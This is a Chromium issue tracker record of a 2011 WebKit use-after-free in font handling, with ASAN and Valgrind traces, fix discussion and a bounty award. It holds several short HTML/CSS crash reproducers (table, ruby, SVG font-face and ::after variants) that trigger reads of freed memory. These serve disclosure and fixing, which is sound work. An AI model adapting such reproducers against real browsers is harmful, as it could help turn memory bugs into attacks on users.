# Use after free due to style not updated for ANONYMOUS boxes (e.g RenderRow), inline-blocks (e.g. RenderRubyRun)

| Field | Value |
|-------|-------|
| **Issue ID** | [40093898](https://issues.chromium.org/issues/40093898) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink |
| **Reporter** | in...@chromium.org |
| **Assignee** | in...@chromium.org |
| **Created** | 2011-08-12 |
| **Bounty** | $1,000.00 |

## Description

found in my fuzzing + ASAN + ClusterFuzz

Bot CLUSTER_FUZZ_50 on platform LINUX
Chromium Revision : 96401
Webkit Revision : 92846

Testcase:: (run from LayoutTests/fast/css)
<style>
        @font-face {
            font-family: 'remote';
            src: url(resources/Ahem.ttf);
        }
    
        div { width: 100px;
 font-family: 'remote'; 
 display: table-row;</style>

<script> if (window.layoutTestController) { layoutTestController.waitUntilDone(); }</script>
><div>
        FAIL_<bgsound>


/mnt/scratch0/chrome/src/out/Release/DumpRenderTree 

ASAN:SIGILL
==================================================================
HINT: if your stack trace looks short or garbled, use ASAN_OPTIONS=fast_unwind=0
==7643== ERROR: AddressSanitizer crashed on address 0x00007f24c9a4e890 at pc 0x292aefb bp 0x7fff6eed1b60 sp 0x7fff6eed1b30
READ of size 4 at 0x00007f24c9a4e890 thread T0
    #0 0x292aefb in WebCore::FontMetrics::hasIdenticalAscentDescentAndLineGap(WebCore::FontMetrics const&) const 
    #1 0x29298fc in WebCore::InlineFlowBox::addToLine(WebCore::InlineBox*) 
    #2 0x29d15ef in WebCore::RenderBlock::constructLine(WebCore::BidiRunList<WebCore::BidiRun>&, WebCore::LineInfo const&) 
    #3 0x29d6f0b in WebCore::RenderBlock::createLineBoxesFromBidiRuns(WebCore::BidiRunList<WebCore::BidiRun>&, WebCore::InlineIterator const&, WebCore::LineInfo&, WebCore::VerticalPositionCache&, WebCore::BidiRun*) 
    #4 0x29de763 in WebCore::RenderBlock::layoutRunsAndFloatsInRange(WebCore::LineLayoutState&, WebCore::BidiResolver<WebCore::InlineIterator, WebCore::BidiRun>&, WebCore::InlineIterator const&, WebCore::BidiStatus const&) 
    #5 0x29d85ae in WebCore::RenderBlock::layoutRunsAndFloats(WebCore::LineLayoutState&, bool) 
    #6 0x29f767e in WebCore::RenderBlock::layoutInlineChildren(bool, int&, int&) 
    #7 0x296dd32 in WebCore::RenderBlock::layoutBlock(bool, int, WebCore::RenderBlock::BlockLayoutPass) 
    #8 0x2b917bf in WebCore::RenderTableCell::layout() 
    #9 0x2ba47f7 in WebCore::RenderTableRow::layout() 
    #10 0x2baaec7 in WebCore::RenderTableSection::layout() 
    #11 0x2b835a2 in WebCore::RenderTable::layout() 
    #12 0x2987fe7 in WebCore::RenderBlock::layoutBlockChild(WebCore::RenderBox*, WebCore::RenderBlock::MarginInfo&, int&, int&) 
    #13 0x2975da4 in WebCore::RenderBlock::layoutBlockChildren(bool, int&) 
    #14 0x296dd4e in WebCore::RenderBlock::layoutBlock(bool, int, WebCore::RenderBlock::BlockLayoutPass) 
    #15 0x296c819 in WebCore::RenderBlock::layout() 
    #16 0x2987fe7 in WebCore::RenderBlock::layoutBlockChild(WebCore::RenderBox*, WebCore::RenderBlock::MarginInfo&, int&, int&) 
    #17 0x2975da4 in WebCore::RenderBlock::layoutBlockChildren(bool, int&) 
    #18 0x296dd4e in WebCore::RenderBlock::layoutBlock(bool, int, WebCore::RenderBlock::BlockLayoutPass) 
    #19 0x296c819 in WebCore::RenderBlock::layout() 
    #20 0x2987fe7 in WebCore::RenderBlock::layoutBlockChild(WebCore::RenderBox*, WebCore::RenderBlock::MarginInfo&, int&, int&) 
    #21 0x2975da4 in WebCore::RenderBlock::layoutBlockChildren(bool, int&) 
    #22 0x296dd4e in WebCore::RenderBlock::layoutBlock(bool, int, WebCore::RenderBlock::BlockLayoutPass) 
    #23 0x296c819 in WebCore::RenderBlock::layout() 
    #24 0x2c0160e in WebCore::RenderView::layout() 
    #25 0x24dc38a in WebCore::FrameView::layout(bool) 
    #26 0x1b149cf in WebCore::ThreadTimers::sharedTimerFiredInternal() 
    #27 0xe38a19 in base::subtle::TaskClosureAdapter::Run() 
    #28 0xdfe6ac in MessageLoop::RunTask(MessageLoop::PendingTask const&) 
    #29 0xdfecb2 in MessageLoop::DeferOrRunPendingTask(MessageLoop::PendingTask const&) 
    #30 0xdffefe in MessageLoop::DoWork() 
    #31 0xe3eb0f in (anonymous namespace)::WorkSourceDispatch(_GSource*, int (*)(void*), void*) base/message_pump_glib.cc:0
    #32 0x7f24d07078c2 in g_main_dispatch /build/buildd/glib2.0-2.24.1/glib/gmain.c:1960
    #33 0x7f24d070b748 in g_main_context_iterate /build/buildd/glib2.0-2.24.1/glib/gmain.c:2591
    #34 0x7f24d070b8fc in IA__g_main_context_iteration /build/buildd/glib2.0-2.24.1/glib/gmain.c:2654
    #35 0xe40da1 in base::MessagePumpGtk::RunOnce(_GMainContext*, bool) 
    #36 0xe3f6ad in base::MessagePumpGlib::RunWithDispatcher(base::MessagePump::Delegate*, base::MessagePumpDispatcher*) 
    #37 0xdfd5d7 in MessageLoop::RunInternal() 
    #38 0xdfc59e in MessageLoop::Run() 
    #39 0x480b65 in TestShell::waitTestFinished() 
    #40 0x47863d in TestShell::runFileTest(TestParams const&) 
    #41 0x42dbeb in runTest(TestShell&, TestParams&, std::basic_string<char, std::char_traits<char>, std::allocator<char> > const&, bool) third_party/WebKit/Tools/DumpRenderTree/chromium/DumpRenderTree.cpp:0
    #42 0x42ca92 in main 
    #43 0x7f24ce3a8c4d in __libc_start_main /build/buildd/eglibc-2.11.1/csu/libc-start.c:258
    #44 0x418d09 in _start 
0x00007f24c9a4e890 is located 16 bytes inside of 1208-byte region [0x00007f24c9a4e880,0x00007f24c9a4ed38)
freed by thread T0 here:
    #1 0x290c263 in WebCore::CSSFontFaceSource::pruneTable() 
    #2 0x290c501 in WebCore::CSSFontFaceSource::fontLoaded(WebCore::CachedFont*) 
    #3 0x288633d in WebCore::CachedFont::checkNotify() 
    #4 0x2418127 in WebCore::CachedResourceRequest::didFinishLoading(WebCore::SubresourceLoader*, double) 
    #5 0x23dd941 in WebCore::SubresourceLoader::didFinishLoading(double) 
    #6 0x30496b9 in webkit_glue::WebURLLoaderImpl::Context::OnCompletedRequest(net::URLRequestStatus const&, std::basic_string<char, std::char_traits<char>, std::allocator<char> > const&, base::Time const&) 
    #7 0x316cfa9 in (anonymous namespace)::RequestProxy::NotifyCompletedRequest(net::URLRequestStatus const&, std::basic_string<char, std::char_traits<char>, std::allocator<char> > const&, base::Time const&) webkit/tools/test_shell/simple_resource_loader_bridge.cc:0
    #8 0xe38a19 in base::subtle::TaskClosureAdapter::Run() 
    #9 0xdfe6ac in MessageLoop::RunTask(MessageLoop::PendingTask const&) 
    #10 0xdfecb2 in MessageLoop::DeferOrRunPendingTask(MessageLoop::PendingTask const&) 
    #11 0xdffefe in MessageLoop::DoWork() 
    #12 0xe3eb0f in (anonymous namespace)::WorkSourceDispatch(_GSource*, int (*)(void*), void*) base/message_pump_glib.cc:0
    #13 0x7f24d07078c2 in g_main_dispatch /build/buildd/glib2.0-2.24.1/glib/gmain.c:1960
previously allocated by thread T0 here:
    #1 0xd5b3f9 in WTF::fastMalloc(unsigned long) 
    #2 0x290d33b in WebCore::CSSFontFaceSource::getFontData(WebCore::FontDescription const&, bool, bool, WebCore::CSSFontSelector*) 
    #3 0x290a26a in WebCore::CSSFontFace::getFontData(WebCore::FontDescription const&, bool, bool) 
    #4 0x274e6ee in WebCore::CSSSegmentedFontFace::getFontData(WebCore::FontDescription const&) 
    #5 0x2722625 in WebCore::CSSFontSelector::getFontData(WebCore::FontDescription const&, WTF::AtomicString const&) 
    #6 0x1b594f1 in WebCore::FontCache::getFontData(WebCore::Font const&, int&, WebCore::FontSelector*) 
    #7 0x1b62630 in WebCore::FontFallbackList::fontDataAt(WebCore::Font const*, unsigned int) const 
    #8 0x29bdb53 in WebCore::RenderBlock::constructTextRun(WebCore::RenderObject*, WebCore::Font const&, unsigned short const*, int, WebCore::RenderStyle*, unsigned int, unsigned int) 
    #9 0x2bc4746 in WebCore::RenderText::computePreferredLogicalWidths(float, WTF::HashSet<WebCore::SimpleFontData const*, WTF::PtrHash<WebCore::SimpleFontData const*>, WTF::HashTraits<WebCore::SimpleFontData const*> >&, WebCore::GlyphOverflow&) 
    #10 0x2bc1bbe in WebCore::RenderText::computePreferredLogicalWidths(float) 
    #11 0x2bbfedc in WebCore::RenderText::trimmedPrefWidths(float, float&, bool&, float&, bool&, bool&, bool&, float&, float&, float&, float&, bool&) 
    #12 0x29abc4f in WebCore::RenderBlock::computeInlinePreferredLogicalWidths() 
    #13 0x29aaa9a in WebCore::RenderBlock::computePreferredLogicalWidths() 
    #14 0x2b91280 in WebCore::RenderTableCell::computePreferredLogicalWidths() 
    #15 0x2c55b90 in WebCore::AutoTableLayout::recalcColumn(int) 
    #16 0x2c5738a in WebCore::AutoTableLayout::fullRecalc() 
    #17 0x2c579a2 in WebCore::AutoTableLayout::computePreferredLogicalWidths(int&, int&) 
    #18 0x2b896f9 in WebCore::RenderTable::computePreferredLogicalWidths() 
    #19 0x2a0d071 in WebCore::RenderBox::maxPreferredLogicalWidth() const 
    #20 0x2b81b81 in WebCore::RenderTable::computeLogicalWidth() 
    #21 0x2b83130 in WebCore::RenderTable::layout() 
    #22 0x2987fe7 in WebCore::RenderBlock::layoutBlockChild(WebCore::RenderBox*, WebCore::RenderBlock::MarginInfo&, int&, int&) 
    #23 0x2975da4 in WebCore::RenderBlock::layoutBlockChildren(bool, int&) 
==7643== ABORTING
Stats: 0M malloced (0M for red zones) by 0 calls
Stats: 0M realloced by 0 calls
Stats: 0M freed by 0 calls
Stats: 0M really freed by 0 calls
Stats: 0M (0 pages) mmaped in 0 calls
 mmaps   by size:
 mallocs by size:
 frees   by size:
 rfrees  by size:
Stats: malloc large: 0 small slow: 0
Shadow byte and word:
  0x00001fe499349d12: fb
  0x00001fe499349d10: fb fb fb fb fb fb fb fb
More shadow bytes:
  0x00001fe499349cf0: ff ff ff ff ff ff ff ff
  0x00001fe499349cf8: ff ff ff ff ff ff ff ff
  0x00001fe499349d00: ff ff ff ff ff ff ff ff
  0x00001fe499349d08: ff ff ff ff ff ff ff ff
=>0x00001fe499349d10: fb fb fb fb fb fb fb fb
  0x00001fe499349d18: fb fb fb fb fb fb fb fb
  0x00001fe499349d20: fb fb fb fb fb fb fb fb
  0x00001fe499349d28: fb fb fb fb fb fb fb fb
  0x00001fe499349d30: fb fb fb fb fb fb fb fb
	base::debug::StackTrace::StackTrace() [0xe4b986]
	base::(anonymous namespace)::StackDumpSignalHandler() [0xe2692b]
	0x7f24ce3bdaf0
	0x7f24ce3bda75
	0x7f24ce3c15c0
	asan_report_error() [0x43d2978]
	0x7f24cf2af8f0
	WebCore::FontMetrics::hasIdenticalAscentDescentAndLineGap() [0x292aefb]
	WebCore::InlineFlowBox::addToLine() [0x29298fc]
	WebCore::RenderBlock::constructLine() [0x29d15ef]
	WebCore::RenderBlock::createLineBoxesFromBidiRuns() [0x29d6f0b]
	WebCore::RenderBlock::layoutRunsAndFloatsInRange() [0x29de763]
	WebCore::RenderBlock::layoutRunsAndFloats() [0x29d85ae]
	WebCore::RenderBlock::layoutInlineChildren() [0x29f767e]
	WebCore::RenderBlock::layoutBlock() [0x296dd32]
	WebCore::RenderTableCell::layout() [0x2b917bf]
	WebCore::RenderTableRow::layout() [0x2ba47f7]
	WebCore::RenderTableSection::layout() [0x2baaec7]
	WebCore::RenderTable::layout() [0x2b835a2]
	WebCore::RenderBlock::layoutBlockChild() [0x2987fe7]
	WebCore::RenderBlock::layoutBlockChildren() [0x2975da4]
	WebCore::RenderBlock::layoutBlock() [0x296dd4e]
	WebCore::RenderBlock::layout() [0x296c819]
	WebCore::RenderBlock::layoutBlockChild() [0x2987fe7]
	WebCore::RenderBlock::layoutBlockChildren() [0x2975da4]
	WebCore::RenderBlock::layoutBlock() [0x296dd4e]
	WebCore::RenderBlock::layout() [0x296c819]
	WebCore::RenderBlock::layoutBlockChild() [0x2987fe7]
	WebCore::RenderBlock::layoutBlockChildren() [0x2975da4]
	WebCore::RenderBlock::layoutBlock() [0x296dd4e]
	WebCore::RenderBlock::layout() [0x296c819]
	WebCore::RenderView::layout() [0x2c0160e]
	WebCore::FrameView::layout() [0x24dc38a]
	WebCore::ThreadTimers::sharedTimerFiredInternal() [0x1b149cf]
	base::subtle::TaskClosureAdapter::Run() [0xe38a19]
	MessageLoop::RunTask() [0xdfe6ac]
	MessageLoop::DeferOrRunPendingTask() [0xdfecb2]
	MessageLoop::DoWork() [0xdffefe]
	(anonymous namespace)::WorkSourceDispatch() [0xe3eb0f]
	0x7f24d07078c2
	0x7f24d070b748
	0x7f24d070b8fc
	base::MessagePumpGtk::RunOnce() [0xe40da1]
	base::MessagePumpGlib::RunWithDispatcher() [0xe3f6ad]
	MessageLoop::RunInternal() [0xdfd5d7]
	MessageLoop::Run() [0xdfc59e]
	TestShell::waitTestFinished() [0x480b65]
	TestShell::runFileTest() [0x47863d]
	runTest() [0x42dbeb]
	main [0x42ca92]
	0x7f24ce3a8c4d
	0x418d09


## Attachments

- [vg-svgfont.txt](attachments/vg-svgfont.txt) (text/plain; charset=us-ascii, 32.9 KB)
- [svgfont.txt](attachments/svgfont.txt) (text/plain; charset=us-ascii, 9.3 KB)
- [svgfont.html](attachments/svgfont.html) (text/plain; charset=us-ascii, 239 B)
- [displayblock.txt](attachments/displayblock.txt) (text/plain; charset=us-ascii, 10.3 KB)
- [displayblock.html](attachments/displayblock.html) (text/plain; charset=us-ascii, 244 B)
- [32_1208.html](attachments/32_1208.html) (text/html; charset=us-ascii, 11.0 KB)
- [vg.txt](attachments/vg.txt) (text/plain; charset=us-ascii, 7.0 KB)

## Timeline

### sc...@gmail.com (2011-08-12)

This is the one I have a fix for. I think it's just a Medium; only simple metric properties are read.

### in...@chromium.org (2011-08-12)

I think you meant the awesome fuzzed hack, not the fix :):) We should OKR the FuzzFixingInfrastructure idea.

Upstreamed
https://bugs.webkit.org/show_bug.cgi?id=66141

### kc...@chromium.org (2011-08-18)

[Empty comment from Monorail migration]

### sc...@gmail.com (2011-08-25)

[Empty comment from Monorail migration]

### sc...@gmail.com (2011-08-25)

slaweck had an earlier report of this, so we'll consider him for reward.

See https://code.google.com/p/chromium/issues/detail?id=91275

Our lower-severity ruby issue repro is:

<style>
   @font-face {
       font-family: family1;

 src: url(resources/Ahem.woff) format("woff");     }
</style>


<ruby style="font-family: family1;
 ">Failure


But slaweck found a more serious variant:

<!DOCTYPE html>
<script>
    setTimeout("window.location.reload()", 1000)
</script>
<style>

@font-face {
	font-family: foo;
	src: url('Vani.woff') ;
}
</style>

<html>

    <body style="-webkit-writing-mode: vertical-rl; font-family: foo; " >
            <ruby style="-webkit-text-combine: horizontal;">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</ruby>
    </body>
</html>

### in...@chromium.org (2011-08-26)

[Empty comment from Monorail migration]

### in...@chromium.org (2011-08-29)

Miaubiz, please attach your font related testcases here. If they turn as different bugs, i will make sure to file new bugs with your due credit. Right now, they looks the same, in either tables or ruby.

### mi...@gmail.com (2011-08-29)

here is an svg alternative with:  <font-face-uri xlink:href="A"/>

READ of size 4 at 0x00007fffe4ab4890 thread T0
    #0 0x7ffff4fd8224 in WebCore::SVGInlineTextBox::calculateBoundaries() const ???:0
0x00007fffe4ab4890 is located 16 bytes inside of 1208-byte region [0x00007fffe4ab4880,0x00007fffe4ab4d38)
freed by thread T0 here:
    #0 0x7ffff6c7610a in free _asan_rtl_
    #1 0x7ffff4c32913 in WebCore::CSSFontFaceSource::pruneTable() ???:0
previously allocated by thread T0 here:
    #0 0x7ffff6c75ffa in malloc _asan_rtl_
    #1 0x7ffff371961b in WTF::fastMalloc(unsigned long) ???:0
    #2 0x7ffff4c339ca in WebCore::CSSFontFaceSource::getFontData(WebCore::FontDescription const&, bool, bool, WebCore::CSSFontSelector*) ???:0



### mi...@gmail.com (2011-08-30)

display: block

--
<style>
@font-face { font-family: "A"; src: url(); }
div { font-family: A;  }
div::after {
  content:counter(ctr) url();
  counter-increment:ctr;
  display:block; 
}
</style>
<div>A</div>
<script>
  document.execCommand("SelectAll");
</script>

### in...@chromium.org (2011-08-30)

One part of the fix went in http://code.google.com/p/chromium/issues/detail?id=94800
http://trac.webkit.org/changeset/94109. Now i can focus on the remaining.

### mi...@gmail.com (2011-08-31)

32 inside 1208, large and iffy repro

Invalid read of size 4
   at 0x19E5DE1: WebCore::CSSPrimitiveValue::computeLengthDouble(WebCore::RenderStyle*, WebCore::RenderStyle*, double, bool) (in /usr/lib/chromium-browser/chromium-browser)
   by 0x19E5F6B: WebCore::Length WebCore::CSSPrimitiveValue::computeLength<WebCore::Length>(WebCore::RenderStyle*, WebCore::RenderStyle*, double, bool) (in /usr/lib/chromium-browser/chromium-browser)

Address 0x129c59d0 is 32 bytes inside a block of size 1,208 free'd
   at 0x4C29146: free (vg_replace_malloc.c:913)
   by 0x1CF9F26: WebCore::CSSFontFaceSource::pruneTable() (in /usr/lib/chromium-browser/chromium-browser)
   by 0x1CF9FA8: WebCore::CSSFontFaceSource::fontLoaded(WebCore::CachedFont*) (in /usr/lib/chromium-browser/chromium-browser)


### in...@chromium.org (2011-08-31)

Thanks a lot miaubiz for all these repros.

### in...@chromium.org (2011-09-01)

https://bugs.webkit.org/show_bug.cgi?id=67364 (this should fix all ruby and table variants).

SVG one is another beast. Didnt get time to loook into svg layout :(

### in...@chromium.org (2011-09-01)

miaubiz, can you please file a new bug on the svg testcase in c#8. 

Yipee, had a chat with Dave. i have to use solution #2 (performant one).

### in...@chromium.org (2011-09-01)

miaubiz, dont need to file it. i filed for you - http://code.google.com/p/chromium/issues/detail?id=95072

repros in c#8, c#11 show stale font stored in svgtext runs. i will study it later.

### mi...@gmail.com (2011-09-01)

@inferno: thank you for filing it.

### in...@chromium.org (2011-09-06)

Fixed in http://trac.webkit.org/changeset/94543 and merged to m14 just in time at http://trac.webkit.org/changeset/94544. Thanks to super awesome James.

### in...@chromium.org (2011-09-06)

[Empty comment from Monorail migration]

### in...@chromium.org (2011-09-06)

Slaweck, can you please try and see if your fuzzer reproduces any ruby crashers.

### sl...@gmail.com (2011-09-06)

It looks fixed on 14.0.835.157 - tested on my few testcases related to this issue. And I don't see any other ruby related bug, at this moment.

### in...@chromium.org (2011-09-07)

Thanks Slaweck.

### sc...@gmail.com (2011-09-08)

@slaweck: good to see you back! And thanks for a nice bug. Thanks for the small repro, good for a $1000 Chromium Security Reward.

----
Boilerplate text:
Please do NOT publicly disclose details until a fix has been released to all our
users. Early public disclosure may cancel the provisional reward.
Also, please be considerate about disclosure when the bug affects a core library
that may be used by other products.
Please do NOT share this information with third parties who are not directly
involved in fixing the bug. Doing so may cancel the provisional reward.
Please be honest if you have already disclosed anything publicly or to third parties.
----

### sc...@gmail.com (2011-09-09)

[Empty comment from Monorail migration]

### sc...@gmail.com (2011-09-09)

[Empty comment from Monorail migration]

### sc...@gmail.com (2011-09-23)

Payment in system.

### js...@chromium.org (2011-10-05)

Batch update.

### [Deleted User] (2012-05-15)

Marking old security bugs Fixed..

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-01)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### in...@chromium.org (2014-05-14)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-26)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-26)

This issue was migrated from crbug.com/chromium/92651?no_tracker_redirect=1

[Monorail mergedwith: crbug.com/chromium/91275, crbug.com/chromium/94427, crbug.com/chromium/94800]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40093898)*
